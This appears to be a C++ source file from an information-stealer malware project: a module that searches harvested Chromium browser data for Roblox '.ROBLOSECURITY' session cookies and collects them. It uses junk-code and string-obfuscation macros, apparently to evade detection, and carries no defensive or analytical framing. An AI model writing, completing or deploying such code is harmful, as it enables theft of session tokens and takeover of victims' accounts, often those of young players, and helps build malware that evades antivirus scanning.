#include "Roblox.h"
#include "../utils/Config.h"
#include "Chromium.h"
#include "../core/Obfuscation.h"
#include "../../DebugLog.h"
namespace Modules {
    std::vector<std::string> Roblox::Grab() {
        JUNK_CODE_SMALL
        SLOG("[*] Filtering Chromium data for Roblox cookies...");
        std::vector<std::string> cookies;
        auto chromeData = Chromium::Grab();
        for (const auto& acc : chromeData) {
            if (acc.Type == S("Cookie") && acc.URL.find(S("roblox.com")) != std::string::npos) {
                if (acc.UserName == S(".ROBLOSECURITY")) {
                    cookies.push_back(acc.Password);
                }
            }
        }
        // if (!cookies.empty()) SLOG("[+] Found %zu Roblox cookies.", cookies.size());
        return cookies;
    }
}
